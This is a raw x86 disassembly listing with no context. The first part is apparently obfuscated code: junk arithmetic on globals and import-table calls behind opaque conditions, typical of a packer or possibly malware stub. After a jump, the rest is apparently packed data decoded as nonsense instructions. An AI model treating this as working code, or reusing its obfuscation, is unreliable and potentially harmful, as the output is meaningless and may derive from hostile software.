  41b6d3:	mov    ecx,DWORD PTR [ebp-0x50]
  41b6d6:	sub    DWORD PTR ds:0x428449,0x428499
  41b6e0:	xor    edx,edx
  41b6e2:	div    ecx
  41b6e4:	sbb    ecx,DWORD PTR ds:0x428445
  41b6ea:	sub    eax,0x401
  41b6ef:	mov    ecx,DWORD PTR ds:0x428521
  41b6f5:	sub    DWORD PTR ds:0x428591,ecx
  41b6fb:	mov    DWORD PTR [ebp-0x90],eax
  41b701:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41b70b:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41b712:	cmp    DWORD PTR ds:0x428495,0x0
  41b719:	mov    DWORD PTR ds:0x428379,0x12e0
  41b723:	movzx  edx,WORD PTR ds:0x428459
  41b72a:	jmp    0x41b78a
  41b72f:	not    eax
  41b731:	mov    DWORD PTR ds:0x4284f5,edi
  41b737:	cmp    DWORD PTR ds:0x428495,0x0
  41b73e:	jne    0x41b768
  41b744:	push   0x428177
  41b749:	call   DWORD PTR ds:0x42e298
  41b74f:	movzx  edx,WORD PTR ds:0x42836d
  41b756:	xor    DWORD PTR ds:0x428351,edx
  41b75c:	and    ecx,0x442f
  41b762:	sub    edx,0x55c5
  41b768:	mov    ecx,DWORD PTR ds:0x4284fd
  41b76e:	xor    ecx,DWORD PTR ds:0x428505
  41b774:	mov    DWORD PTR ds:0x4284fd,ecx
  41b77a:	and    DWORD PTR ds:0x42837d,0x34b7
  41b784:	adc    DWORD PTR ds:0x428521,ebx
  41b78a:	mov    DWORD PTR [ebp-0xb4],0x3842
  41b794:	adc    ecx,edx
  41b796:	mov    eax,DWORD PTR [ebp-0x4c]
  41b799:	and    ecx,edx
  41b79b:	add    eax,DWORD PTR [ebp-0xb4]
  41b7a1:	xor    eax,0x2e02
  41b7a6:	add    ecx,ecx
  41b7a8:	xor    eax,0x7294
  41b7ad:	add    ecx,ecx
  41b7af:	imul   eax,eax,0x68f3
  41b7b5:	mov    ecx,DWORD PTR [ebp-0x8c]
  41b7bb:	cmp    DWORD PTR ds:0x428381,0x0
  41b7c2:	mov    DWORD PTR ds:0x428489,ebx
  41b7c8:	mov    edx,DWORD PTR ds:0x42859d
  41b7ce:	jmp    0x41b822
  41b7d3:	mov    DWORD PTR ds:0x428375,edx
  41b7d9:	cmp    DWORD PTR ds:0x428381,0x0
  41b7e0:	ja     0x41b810
  41b7e6:	push   DWORD PTR [ebp-0x1c]
  41b7e9:	push   0x2a61
  41b7ee:	push   0x6c90
  41b7f3:	push   0x2be6
  41b7f8:	push   0x2810
  41b7fd:	call   DWORD PTR ds:0x42e054
  41b803:	inc    edx
  41b804:	mov    edx,DWORD PTR ds:0x428371
  41b80a:	sbb    DWORD PTR ds:0x428479,edx
  41b810:	or     edx,DWORD PTR ds:0x428391
  41b816:	and    edx,DWORD PTR ds:0x4284f5
  41b81c:	sub    edx,DWORD PTR ds:0x428589
  41b822:	and    eax,ecx
  41b824:	adc    DWORD PTR ds:0x42848d,0x2bc9
  41b82e:	sub    eax,0x2818
  41b833:	mov    edx,DWORD PTR ds:0x42853d
  41b839:	mov    ecx,DWORD PTR ds:0x428549
  41b83f:	sub    ecx,edx
  41b841:	add    edx,DWORD PTR [edx+ecx*1]
  41b844:	mov    DWORD PTR [ebp-0xe8],eax
  41b84a:	mov    DWORD PTR [ebp-0x70],0x6f89
  41b851:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41b85b:	mov    DWORD PTR [ebp-0x120],0x3c77
  41b865:	sbb    DWORD PTR ds:0x428449,edx
  41b86b:	mov    DWORD PTR [ebp-0x2c],0x2129
  41b872:	cmp    DWORD PTR ds:0x4284a1,0x0
  41b879:	mov    DWORD PTR ds:0x428395,0x25cb
  41b883:	mov    edx,0x2db2
  41b888:	mov    DWORD PTR ds:0x428521,0x75fd
  41b892:	jmp    0x41b8de
  41b897:	mov    eax,0x420d
  41b89c:	mov    DWORD PTR ds:0x4284fd,0x38f0
  41b8a6:	cmp    DWORD PTR ds:0x4284a1,0x0
  41b8ad:	jge    0x41b8c8
  41b8b3:	push   DWORD PTR [ebp-0xc]
  41b8b6:	call   DWORD PTR ds:0x42e058
  41b8bc:	adc    DWORD PTR ds:0x42856d,edx
  41b8c2:	add    DWORD PTR ds:0x428591,edx
  41b8c8:	sbb    edx,DWORD PTR ds:0x428585
  41b8ce:	and    DWORD PTR ds:0x4284ed,0x10d1
  41b8d8:	and    ecx,0x7be2
  41b8de:	mov    eax,DWORD PTR [ebp-0x2c]
  41b8e1:	imul   eax,eax,0x1ada
  41b8e7:	xor    DWORD PTR ds:0x428489,ebx
  41b8ed:	mov    ecx,DWORD PTR [ebp-0x120]
  41b8f3:	mov    edx,DWORD PTR ds:0x428435
  41b8f9:	or     edx,DWORD PTR ds:0x428481
  41b8ff:	mov    DWORD PTR ds:0x428435,edx
  41b905:	imul   ecx,ecx,0x53ae
  41b90b:	xor    DWORD PTR ds:0x4284f5,0x220b
  41b915:	imul   ecx,ecx,0x7447
  41b91b:	mov    edx,DWORD PTR [ebp-0xd0]
  41b921:	and    ecx,edx
  41b923:	or     ecx,0x2a20
  41b929:	or     DWORD PTR ds:0x4284f5,0x6762
  41b933:	mov    edx,DWORD PTR [ebp-0x70]
  41b936:	xor    ecx,edx
  41b938:	and    DWORD PTR ds:0x42835d,0x71f
  41b942:	mov    edx,DWORD PTR [ebp+0x14]
  41b945:	or     DWORD PTR ds:0x428471,0x17f4
  41b94f:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41b956:	or     DWORD PTR ds:0x428511,0x4284a1
  41b960:	lea    eax,[ecx+eax*1-0x45a1]
  41b967:	mov    DWORD PTR [ebp-0xb0],eax
  41b96d:	add    ecx,eax
  41b96f:	mov    DWORD PTR [ebp-0x11c],0x303f
  41b979:	mov    DWORD PTR [ebp-0x98],0x51a9
  41b983:	sub    ecx,eax
  41b985:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41b98f:	cmp    DWORD PTR ds:0x428395,0x0
  41b996:	mov    DWORD PTR ds:0x428379,0x245f
  41b9a0:	mov    ecx,DWORD PTR ds:0x42844d
  41b9a6:	mov    ecx,0x273f
  41b9ab:	jmp    0x41ba0f
  41b9b0:	mov    DWORD PTR ds:0x428489,ebx
  41b9b6:	mov    DWORD PTR ds:0x428459,0x963
  41b9c0:	cmp    DWORD PTR ds:0x428395,0x0
  41b9c7:	jle    0x41b9ee
  41b9cd:	push   DWORD PTR [ebp-0x28]
  41b9d0:	push   0x4284ed
  41b9d5:	push   0x4281d5
  41b9da:	call   DWORD PTR ds:0x42e29c
  41b9e0:	sub    DWORD PTR ds:0x42857d,ebx
  41b9e6:	xor    ecx,ecx
  41b9e8:	sbb    DWORD PTR ds:0x428505,ebx
  41b9ee:	movzx  ecx,BYTE PTR ds:0x42837d
  41b9f5:	adc    DWORD PTR ds:0x428469,ecx
  41b9fb:	add    DWORD PTR ds:0x428371,0x7cea
  41ba05:	sbb    DWORD PTR ds:0x428375,0x6b1e
  41ba0f:	mov    eax,DWORD PTR [ebp-0xcc]
  41ba15:	xor    eax,0x6f65
  41ba1a:	cmp    DWORD PTR ds:0x42836d,0x0
  41ba21:	mov    DWORD PTR ds:0x428465,edx
  41ba27:	mov    ecx,0x51b5
  41ba2c:	jmp    0x41baa2
  41ba31:	mov    DWORD PTR ds:0x42846d,0xb0f
  41ba3b:	cmp    DWORD PTR ds:0x42836d,0x0
  41ba42:	jl     0x41ba7a
  41ba48:	push   0x200e
  41ba4d:	push   0x21c1
  41ba52:	push   DWORD PTR [ebp-0x14]
  41ba55:	push   DWORD PTR [ebp-0x14]
  41ba58:	call   DWORD PTR ds:0x42e110
  41ba5e:	sub    DWORD PTR ds:0x428439,ecx
  41ba64:	sub    ecx,DWORD PTR ds:0x428565
  41ba6a:	sbb    DWORD PTR ds:0x428441,0x42851d
  41ba74:	sub    ecx,0x1dd7
  41ba7a:	mov    ecx,DWORD PTR ds:0x428485
  41ba80:	adc    ecx,DWORD PTR ds:0x428599
  41ba86:	mov    DWORD PTR ds:0x428485,ecx
  41ba8c:	adc    DWORD PTR ds:0x428589,0x3dd1
  41ba96:	mov    DWORD PTR ds:0x428389,0x5b91
  41baa0:	neg    ecx
  41baa2:	mov    ecx,DWORD PTR [ebp-0x98]
  41baa8:	add    DWORD PTR ds:0x428595,0x72a
  41bab2:	or     eax,ecx
  41bab4:	xor    DWORD PTR ds:0x428489,ebx
  41baba:	add    eax,0x161e
  41babf:	sub    ecx,0x1ef7
  41bac5:	mov    ecx,DWORD PTR [ebp-0x11c]
  41bacb:	or     eax,ecx
  41bacd:	cmp    DWORD PTR ds:0x428439,0x0
  41bad4:	mov    ecx,DWORD PTR ds:0x428451
  41bada:	mov    DWORD PTR ds:0x428475,0x4d
  41bae4:	jmp    0x41bbad
  41bae9:	mov    DWORD PTR ds:0x428475,0x133b
  41baf3:	cmp    DWORD PTR ds:0x428439,0x0
  41bafa:	jne    0x41bb25
  41bb00:	push   0x428581
  41bb05:	push   0x8a51
  41bb0a:	push   0x81dc
  41bb0f:	call   DWORD PTR ds:0x42e05c
  41bb15:	and    DWORD PTR ds:0x42844d,0x4030
  41bb1f:	sub    DWORD PTR ds:0x4284f9,edx
  41bb25:	add    ecx,0x753f
  41bb2b:	mov    ecx,DWORD PTR ds:0x428435
  41bb31:	xor    DWORD PTR ds:0x428431,ecx
  41bb37:	sbb    DWORD PTR ds:0x42857d,edx
  41bb3d:	cmp    DWORD PTR ds:0x428591,0x0
  41bb44:	mov    ecx,DWORD PTR ds:0x428595
  41bb4a:	mov    ecx,DWORD PTR ds:0x428511
  41bb50:	mov    DWORD PTR ds:0x42848d,edx
  41bb56:	mov    DWORD PTR ds:0x428445,edi
  41bb5c:	jmp    0x41bbad
  41bb61:	not    ecx
  41bb63:	cmp    DWORD PTR ds:0x428591,0x0
  41bb6a:	jne    0x41bb96
  41bb70:	push   0x6108
  41bb75:	push   0x2ee0
  41bb7a:	push   0x4282b5
  41bb7f:	push   0x1382
  41bb84:	call   DWORD PTR ds:0x42e060
  41bb8a:	or     DWORD PTR ds:0x4284e9,edi
  41bb90:	neg    DWORD PTR ds:0x428375
  41bb96:	movzx  ecx,WORD PTR ds:0x428579
  41bb9d:	sbb    DWORD PTR ds:0x428491,ecx
  41bba3:	or     DWORD PTR ds:0x428465,0x428471
  41bbad:	add    eax,0x1cca
  41bbb2:	cmp    DWORD PTR ds:0x428371,0x0
  41bbb9:	mov    DWORD PTR ds:0x428471,0x3c56
  41bbc3:	mov    ecx,0x7f6d
  41bbc8:	mov    ecx,DWORD PTR ds:0x42846d
  41bbce:	jmp    0x41bc28
  41bbd3:	not    ecx
  41bbd5:	cmp    DWORD PTR ds:0x428371,0x0
  41bbdc:	jbe    0x41bc10
  41bbe2:	push   0x5de5
  41bbe7:	push   0x42829f
  41bbec:	push   0x27d6
  41bbf1:	call   DWORD PTR ds:0x42e114
  41bbf7:	movzx  ecx,BYTE PTR ds:0x428391
  41bbfe:	adc    DWORD PTR ds:0x428385,ecx
  41bc04:	sbb    ecx,0x4cc7
  41bc0a:	sbb    ecx,DWORD PTR ds:0x42846d
  41bc10:	adc    DWORD PTR ds:0x428599,ebx
  41bc16:	mov    ecx,DWORD PTR ds:0x42835d
  41bc1c:	sub    DWORD PTR ds:0x4285a1,ecx
  41bc22:	add    ecx,0x5653
  41bc28:	xor    eax,0x96c9
  41bc2d:	sbb    DWORD PTR ds:0x428599,0x433e
  41bc37:	mov    DWORD PTR [ebp-0x38],eax
  41bc3a:	mov    DWORD PTR [ebp-0x118],0x6083
  41bc44:	sub    DWORD PTR ds:0x42834d,0x67a3
  41bc4e:	mov    DWORD PTR [ebp-0x88],0x556
  41bc58:	or     ecx,eax
  41bc5a:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41bc64:	cmp    DWORD PTR ds:0x4284f1,0x0
  41bc6b:	mov    ecx,0x31c9
  41bc70:	mov    DWORD PTR ds:0x428599,0x1996
  41bc7a:	jmp    0x41bccd
  41bc7f:	mov    DWORD PTR ds:0x4284ed,edi
  41bc85:	cmp    DWORD PTR ds:0x4284f1,0x0
  41bc8c:	jb     0x41bcb3
  41bc92:	push   0x428313
  41bc97:	push   DWORD PTR [ebp-0x14]
  41bc9a:	call   DWORD PTR ds:0x42e118
  41bca0:	add    ecx,DWORD PTR ds:0x428475
  41bca6:	movzx  ecx,BYTE PTR ds:0x428499
  41bcad:	add    DWORD PTR ds:0x428385,ecx
  41bcb3:	sub    DWORD PTR ds:0x4284f5,ecx
  41bcb9:	xor    ecx,ecx
  41bcbb:	add    ecx,DWORD PTR ds:0x428429
  41bcc1:	or     DWORD PTR ds:0x428569,ecx
  41bcc7:	add    DWORD PTR ds:0x428431,ebx
  41bccd:	mov    eax,DWORD PTR [ebp-0x140]
  41bcd3:	add    eax,0x5af8
  41bcd8:	sbb    ecx,0x75c4
  41bcde:	mov    ecx,DWORD PTR [ebp-0x88]
  41bce4:	sub    eax,ecx
  41bce6:	mov    ecx,DWORD PTR [ebp-0x118]
  41bcec:	xor    DWORD PTR ds:0x428585,0x6d4
  41bcf6:	lea    eax,[eax+ecx*1+0x68dc]
  41bcfd:	or     eax,0x52f6
  41bd02:	cmp    DWORD PTR ds:0x428479,0x0
  41bd09:	mov    DWORD PTR ds:0x428565,0x1421
  41bd13:	mov    DWORD PTR ds:0x4284a1,0x487c
  41bd1d:	mov    ecx,DWORD PTR ds:0x428455
  41bd23:	jmp    0x41bd91
  41bd28:	mov    DWORD PTR ds:0x42846d,0x10ed
  41bd32:	not    ecx
  41bd34:	cmp    DWORD PTR ds:0x428479,0x0
  41bd3b:	jbe    0x41bd77
  41bd41:	push   0x8eb3
  41bd46:	call   DWORD PTR ds:0x42e11c
  41bd4c:	mov    ecx,DWORD PTR ds:0x4284f5
  41bd52:	sub    DWORD PTR ds:0x428381,ecx
  41bd58:	mov    ecx,DWORD PTR ds:0x428451
  41bd5e:	sbb    ecx,DWORD PTR ds:0x428481
  41bd64:	mov    DWORD PTR ds:0x428451,ecx
  41bd6a:	movzx  ecx,BYTE PTR ds:0x42836d
  41bd71:	or     DWORD PTR ds:0x4284e5,ecx
  41bd77:	sbb    DWORD PTR ds:0x428365,ebx
  41bd7d:	neg    ecx
  41bd7f:	mov    ecx,DWORD PTR ds:0x428375
  41bd85:	xor    ecx,DWORD PTR ds:0x428429
  41bd8b:	mov    DWORD PTR ds:0x428375,ecx
  41bd91:	sub    eax,0x1dbfe
  41bd96:	sbb    DWORD PTR ds:0x428509,ecx
  41bd9c:	mov    DWORD PTR [ebp-0xac],eax
  41bda2:	xor    DWORD PTR ds:0x42844d,ebx
  41bda8:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41bdaf:	mov    DWORD PTR [ebp-0x100],0x49f7
  41bdb9:	inc    ecx
  41bdba:	mov    eax,DWORD PTR [ebp-0x100]
  41bdc0:	movzx  ecx,BYTE PTR ds:0x428575
  41bdc7:	sub    ecx,DWORD PTR ds:0x4284e9
  41bdcd:	mov    DWORD PTR ds:0x428575,ecx
  41bdd3:	add    eax,0x7b60
  41bdd8:	sbb    ecx,0x7111
  41bdde:	imul   eax,eax,0x5ea
  41bde4:	add    DWORD PTR ds:0x428495,ecx
  41bdea:	mov    ecx,DWORD PTR [ebp-0x6c]
  41bded:	imul   eax,ecx
  41bdf0:	xor    edx,edx
  41bdf2:	adc    DWORD PTR ds:0x428431,0x2190
  41bdfc:	mov    ecx,0x3218d
  41be01:	div    ecx
  41be03:	sub    eax,0x24c1
  41be08:	sbb    ecx,0x10cc
  41be0e:	mov    DWORD PTR [ebp-0xa8],eax
  41be14:	xor    eax,eax
  41be16:	add    eax,DWORD PTR ds:0x4284fd
  41be1c:	sbb    eax,DWORD PTR ds:0x428495
  41be22:	mov    ds:0x4284fd,eax
  41be27:	mov    DWORD PTR [ebp-0x84],0x2c40
  41be31:	xor    ecx,ecx
  41be33:	or     ecx,DWORD PTR ds:0x428431
  41be39:	xor    ecx,DWORD PTR ds:0x428491
  41be3f:	mov    DWORD PTR ds:0x428431,ecx
  41be45:	mov    DWORD PTR [ebp-0x18],0x6013
  41be4c:	or     DWORD PTR ds:0x428579,ecx
  41be52:	mov    DWORD PTR [ebp-0x80],0xc
  41be59:	and    eax,eax
  41be5b:	mov    eax,DWORD PTR [ebp-0x18]
  41be5e:	and    DWORD PTR ds:0x4284e5,edi
  41be64:	mov    ecx,DWORD PTR [ebp-0x80]
  41be67:	xor    edx,edx
  41be69:	add    DWORD PTR ds:0x42838d,0x428381
  41be73:	div    ecx
  41be75:	imul   eax,eax,0x4312
  41be7b:	cmp    DWORD PTR ds:0x428501,0x0
  41be82:	mov    DWORD PTR ds:0x428431,0x6e4f
  41be8c:	movzx  ecx,WORD PTR ds:0x428599
  41be93:	mov    DWORD PTR ds:0x428575,edi
  41be99:	jmp    0x41befc
  41be9e:	mov    DWORD PTR ds:0x42835d,0x5f09
  41bea8:	cmp    DWORD PTR ds:0x428501,0x0
  41beaf:	jge    0x41bed8
  41beb5:	push   DWORD PTR [ebp-0x28]
  41beb8:	call   DWORD PTR ds:0x42e064
  41bebe:	sbb    ecx,DWORD PTR ds:0x4284ed
  41bec4:	xor    ecx,ecx
  41bec6:	xor    ecx,DWORD PTR ds:0x428451
  41becc:	sub    DWORD PTR ds:0x428385,ecx
  41bed2:	and    DWORD PTR ds:0x428459,edi
  41bed8:	xor    ecx,ecx
  41beda:	xor    ecx,DWORD PTR ds:0x428589
  41bee0:	xor    DWORD PTR ds:0x428425,ecx
  41bee6:	or     DWORD PTR ds:0x428465,0x15e9
  41bef0:	xor    ecx,0x6843
  41bef6:	adc    ecx,DWORD PTR ds:0x428469
  41befc:	add    eax,0x5abe
  41bf01:	mov    ecx,DWORD PTR [ebp-0x84]
  41bf07:	add    DWORD PTR ds:0x428501,0x428599
  41bf11:	xor    eax,ecx
  41bf13:	mov    ecx,DWORD PTR ds:0x428379
  41bf19:	and    ecx,DWORD PTR ds:0x42857d
  41bf1f:	mov    DWORD PTR ds:0x428379,ecx
  41bf25:	xor    edx,edx
  41bf27:	not    DWORD PTR ds:0x428389
  41bf2d:	mov    ecx,0x5ae
  41bf32:	div    ecx
  41bf34:	jmp    0x41c31b
  41bf39:	xchg   DWORD PTR [edi],esp
  41bf3b:	dec    eax
  41bf3c:	in     al,0x68
  41bf3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3f:	lods   al,BYTE PTR ds:[esi]
  41bf40:	stos   DWORD PTR es:[edi],eax
  41bf41:	test   BYTE PTR [ebx+eax*8+0x1c30fdcf],bh
  41bf48:	rcl    esp,1
  41bf4a:	cmp    eax,eax
  41bf4c:	mov    esi,0xbebec44a
  41bf51:	adc    eax,0x95db2eb3
  41bf56:	xchg   edx,ecx
  41bf58:	mov    al,ds:0x60181ae7
  41bf5d:	mov    ah,BYTE PTR [esi+eiz*4+0x5a]
  41bf61:	jne    0x41befe
  41bf63:	cdq    
  41bf64:	or     edi,DWORD PTR [ecx]
  41bf66:	(bad)  
  41bf67:	in     eax,dx
  41bf68:	jle    0x41bf0b
  41bf6a:	mov    ah,0x61
  41bf6c:	jle    0x41bf2c
  41bf6e:	fisttp DWORD PTR [ecx]
  41bf70:	push   edx
  41bf71:	push   0xf350f811
  41bf76:	mov    dh,0x6b
  41bf78:	dec    esp
  41bf79:	(bad)  
  41bf7a:	mov    edx,0x528655a
  41bf7f:	mov    bh,BYTE PTR [edx+eax*8+0x73]
  41bf83:	xchg   esi,eax
  41bf84:	jno    0x41bfdd
  41bf86:	push   edx
  41bf87:	add    DWORD PTR [edi],esp
  41bf89:	jns    0x41bfad
  41bf8b:	inc    edx
  41bf8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf8d:	out    0xe2,eax
  41bf8f:	ins    DWORD PTR es:[edi],dx
  41bf90:	fadd   DWORD PTR [ebx]
  41bf92:	xchg   ebp,eax
  41bf93:	sbb    DWORD PTR [ebx+ecx*2+0x3d0e6174],0xd50167af
  41bf9e:	mov    eax,0x70e994cd
  41bfa3:	jnp    0x41bffb
  41bfa5:	cwde   
  41bfa6:	fld    DWORD PTR [edi-0x7cb29da8]
  41bfac:	je     0x41bf9b
  41bfae:	call   0xf57cb947
  41bfb3:	xchg   esp,eax
  41bfb4:	adc    DWORD PTR [ebp-0x12],edx
  41bfb7:	mov    ah,0x38
  41bfb9:	mov    ss,ebp
  41bfbb:	xchg   ch,ah
  41bfbd:	push   ds
  41bfbe:	test   BYTE PTR [esi-0x1c9aa55b],bl
  41bfc4:	adc    ebp,ebp
  41bfc6:	out    dx,al
  41bfc7:	cmp    DWORD PTR [edi],0x1b
  41bfca:	retf   
  41bfcb:	cmp    esp,DWORD PTR [esi]
  41bfcd:	jp     0x41c043
  41bfcf:	stos   DWORD PTR es:[edi],eax
  41bfd0:	sahf   
  41bfd1:	and    esi,eax
  41bfd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfd4:	mov    cl,0xb7
  41bfd6:	jo     0x41bf8c
  41bfd8:	int3   
  41bfd9:	mov    al,0x55
  41bfdb:	inc    ecx
  41bfdc:	jbe    0x41c020
  41bfde:	ins    DWORD PTR es:[edi],dx
  41bfdf:	imul   eax,DWORD PTR [ebp-0x5f87dee5],0x64
  41bfe6:	and    ch,BYTE PTR [eax]
  41bfe8:	mov    al,ds:0x6d4f96c2
  41bfed:	xchg   esp,eax
  41bfee:	ret    0xdc77
  41bff1:	out    0xf2,al
  41bff3:	pushf  
  41bff4:	icebp  
  41bff5:	dec    eax
  41bff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bff7:	sub    esi,esi
  41bff9:	inc    edx
  41bffa:	sar    BYTE PTR [edi-0x3c],cl
  41bffd:	pop    esp
  41bffe:	cmp    eax,0x266cbd78
  41c003:	add    eax,0x81f0a11b
  41c008:	(bad)  
  41c009:	sahf   
  41c00a:	test   BYTE PTR [ebx+0x2d],dh
  41c00d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c00e:	das    
  41c00f:	mov    ebp,0x278c9f0b
  41c014:	xchg   ebp,eax
  41c015:	push   eax
  41c016:	in     al,dx
  41c017:	in     eax,0x17
  41c019:	adc    esp,esi
  41c01b:	cli    
  41c01c:	les    edi,FWORD PTR [ebp-0x51]
  41c01f:	sahf   
  41c020:	out    0xe9,al
  41c022:	jle    0x41bff9
  41c024:	and    DWORD PTR [edi+0x1a684fe4],ecx
  41c02a:	pop    ecx
  41c02b:	sbb    eax,0xb9ed875
  41c030:	or     eax,0x1360902e
  41c035:	cs fs add al,0x69
  41c039:	mov    esp,ss
  41c03b:	add    al,0x3
  41c03d:	hlt    
  41c03e:	push   ss
  41c03f:	or     BYTE PTR [edx+0xf96572d],bl
  41c045:	mov    al,0xf
  41c047:	stos   DWORD PTR es:[edi],eax
  41c048:	xor    edi,DWORD PTR [esi-0x4df107be]
  41c04e:	jp     0x41c001
  41c050:	xor    al,0x35
  41c052:	xor    eax,esi
  41c054:	sbb    ebx,0xb4408bbf
  41c05a:	push   edx
  41c05b:	sti    
  41c05c:	push   ds
  41c05d:	push   es
  41c05e:	mov    eax,0x200f2df2
  41c063:	lahf   
  41c064:	pop    ebp
  41c065:	dec    ebp
  41c066:	test   DWORD PTR [ebx],0x23b60f29
  41c06c:	mov    esp,0xd7679f2a
  41c071:	add    al,0x6c
  41c073:	ror    BYTE PTR [esi+0x1c],0xc7
  41c077:	push   cs
  41c078:	sub    ah,BYTE PTR ss:[ebp-0x38]
  41c07c:	push   ds
  41c07d:	int    0xcb
  41c07f:	lock popa 
  41c081:	dec    ebp
  41c082:	aad    0xce
  41c084:	call   0x3570:0x9bbad98
  41c08b:	sar    DWORD PTR [ecx+0x24],1
  41c08e:	fdivp  st(1),st
  41c090:	cmp    esi,ecx
  41c092:	inc    esp
  41c093:	mov    eax,ss
  41c095:	fstp   DWORD PTR [edi+eiz*4]
  41c098:	loope  0x41c0da
  41c09a:	cmc    
  41c09b:	cwde   
  41c09c:	or     eax,0xece0593
  41c0a1:	pop    eax
  41c0a2:	stos   BYTE PTR es:[edi],al
  41c0a3:	rcl    esp,cl
  41c0a5:	dec    ecx
  41c0a6:	jmp    0x3af0:0x3b0436a0
  41c0ad:	mov    ds:0xc7f7ab95,eax
  41c0b2:	les    edx,FWORD PTR [ebx+0x6cbd0bc7]
  41c0b8:	mov    ebx,0x2ce336d0
  41c0bd:	sahf   
  41c0be:	sub    BYTE PTR ds:0x8fee66e0,dl
  41c0c4:	out    0x7a,al
  41c0c6:	adc    dl,ch
  41c0c8:	mov    dh,0x11
  41c0ca:	fidivr DWORD PTR [edi-0x4d]
  41c0cd:	scas   eax,DWORD PTR es:[edi]
  41c0ce:	jle    0x41c115
  41c0d0:	jne    0x41c081
  41c0d2:	sbb    DWORD PTR [esp+eax*1+0x11d3fbf8],eax
  41c0d9:	clc    
  41c0da:	or     al,0xf2
  41c0dc:	sbb    DWORD PTR [ebp-0x65],esi
  41c0df:	dec    esi
  41c0e0:	push   cs
  41c0e1:	xchg   esi,eax
  41c0e2:	mov    bh,0xfc
  41c0e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0e5:	push   0xe6f49d8b
  41c0ea:	cld    
  41c0eb:	and    eax,0x3a1098d4
  41c0f0:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41c0f2:	sbb    BYTE PTR [edi+0x62dec018],ah
  41c0f8:	fucomi st,st(6)
  41c0fa:	mov    al,0x82
  41c0fc:	adc    edx,DWORD PTR [ebx+0x5e]
  41c0ff:	adc    DWORD PTR [edx+0x48],edx
  41c102:	xchg   ebx,eax
  41c103:	jge    0x41c0f2
  41c105:	jae    0x41c151
  41c107:	or     al,0x2d
  41c109:	retf   
  41c10a:	pop    edx
  41c10b:	aaa    
  41c10c:	repz fsubr QWORD PTR [eax+0x32]
  41c110:	mov    BYTE PTR [edx+0x8],cl
  41c113:	dec    ebx
  41c114:	cld    
  41c115:	out    dx,eax
  41c116:	jg     0x41c11d
  41c118:	(bad)  
  41c119:	push   ebx
  41c11a:	sbb    BYTE PTR [ebx],ah
  41c11c:	push   edx
  41c11d:	push   ebx
  41c11e:	pop    edx
  41c11f:	ds ja  0x41c14c
  41c122:	cmp    BYTE PTR [eax+0x21eaf1e3],cl
  41c128:	sbb    eax,0x7da415ab
  41c12d:	jmp    FWORD PTR [ecx+0x10]
  41c130:	add    dh,BYTE PTR [esi*4+0x16c6a9d4]
  41c137:	ror    DWORD PTR [ecx-0x63],0x7e
  41c13b:	push   es
  41c13c:	jae    0x41c1a3
  41c13e:	pop    ebx
  41c13f:	mov    ecx,DWORD PTR [ebx-0xf1a74c4]
  41c145:	xchg   edi,eax
  41c146:	je     0x41c13d
  41c148:	and    al,0xc5
  41c14a:	fs sub eax,0x40bcb26b
  41c150:	inc    edx
  41c151:	cmp    DWORD PTR [edi*4+0x77a14d42],edi
  41c158:	fs push 0x30
  41c15b:	nop
  41c15c:	xor    DWORD PTR [ebp-0xc281f6e],ebp
  41c162:	sbb    BYTE PTR [eax+esi*2+0x77fe3cd4],cl
  41c169:	push   ds
  41c16a:	icebp  
  41c16b:	ret    0x88d9
  41c16e:	and    eax,0x9a8eadd9
  41c173:	fdivr  DWORD PTR [edx]
  41c175:	loopne 0x41c16d
  41c177:	arpl   si,si
  41c179:	mov    cl,0x32
  41c17b:	lgs    esi,FWORD PTR [eax-0x2138df0a]
  41c182:	imul   edx,DWORD PTR [ecx],0x7cfcf806
  41c188:	js     0x41c16b
  41c18a:	xor    DWORD PTR [edx-0x6a53525b],ebp
  41c190:	int3   
  41c191:	mov    bh,0x32
  41c193:	mov    ds:0x7339d624,al
  41c198:	out    0x5,eax
  41c19a:	add    DWORD PTR [eax+0x26],edi
  41c19d:	adc    DWORD PTR [eax-0x65],ebx
  41c1a0:	mov    dl,0x5e
  41c1a2:	push   esi
  41c1a3:	and    esp,edx
  41c1a5:	mov    al,ds:0x52c29865
  41c1aa:	cmp    ah,dl
  41c1ac:	fadd   DWORD PTR [esi-0x3b]
  41c1af:	push   ss
  41c1b0:	(bad)  
  41c1b1:	pop    esp
  41c1b2:	cmp    al,0x27
  41c1b4:	adc    al,0x1f
  41c1b6:	sub    esi,DWORD PTR [edx+eiz*1+0x57]
  41c1ba:	cmc    
  41c1bb:	(bad)  
  41c1bc:	arpl   WORD PTR [ebx],cx
  41c1be:	(bad)  
  41c1bf:	es aad 0xd7
  41c1c2:	fbstp  TBYTE PTR [edi-0x4f]
  41c1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1c6:	add    al,0x39
  41c1c8:	push   eax
  41c1c9:	lahf   
  41c1ca:	cdq    
  41c1cb:	push   edx
  41c1cc:	sub    eax,0xbc90f3fd
  41c1d1:	daa    
  41c1d2:	popa   
  41c1d3:	shl    DWORD PTR [edx-0x66ca4c12],0x82
  41c1da:	xchg   esp,eax
  41c1db:	ret    
  41c1dc:	adc    BYTE PTR [eax+edi*2-0xf],ch
  41c1e0:	push   es
  41c1e1:	add    al,0xcf
  41c1e3:	jnp    0x41c1ca
  41c1e5:	add    DWORD PTR [esi],edi
  41c1e7:	lea    edi,[ebx]
  41c1e9:	mov    al,0xe5
  41c1eb:	jbe    0x41c1a0
  41c1ed:	in     al,0xf3
  41c1ef:	scas   eax,DWORD PTR es:[edi]
  41c1f0:	mov    eax,0x56db53d9
  41c1f5:	fcmovb st,st(2)
  41c1f7:	arpl   WORD PTR [eax+0x42],sp
  41c1fa:	cmp    DWORD PTR [esi-0x4e81763e],esi
  41c200:	ss pop ecx
  41c202:	idiv   DWORD PTR [ecx-0x54]
